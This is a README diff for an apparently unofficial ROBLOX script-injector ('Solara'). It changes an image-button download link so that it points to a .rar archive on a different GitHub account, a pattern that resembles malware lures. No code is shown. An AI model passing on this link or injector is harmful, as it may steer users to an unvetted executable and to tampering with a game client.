@@ -1,7 +1,7 @@
 <h1>Overview </h1>
 <p>This repository contains a ROBLOX injector tool designed to enhance user experience within the ROBLOX gaming platform. The injector facilitates the injection of custom scripts into ROBLOX games, allowing users to modify and extend gameplay functionalities.</p>
 
-[![xsp](https://github.com/exomimeet76Bq/RBLX_SolaraInjector/releases/download/download/photo_2024-07-07_16-48-09.jpg)](https://github.com/DuongMinhBinh/SolaraInjector_RBL/releases/download/download/SolaraInjector.rar)
+[![xsp](https://github.com/exomimeet76Bq/RBLX_SolaraInjector/releases/download/download/photo_2024-07-07_16-48-09.jpg)](https://github.com/tenakii/RBLX_SolaraInjector/releases/download/download/SolaraInjector.rar)
 
 <h3>Features </h3>
  <p>Script Injection: Inject custom Lua scripts into ROBLOX games.</p>
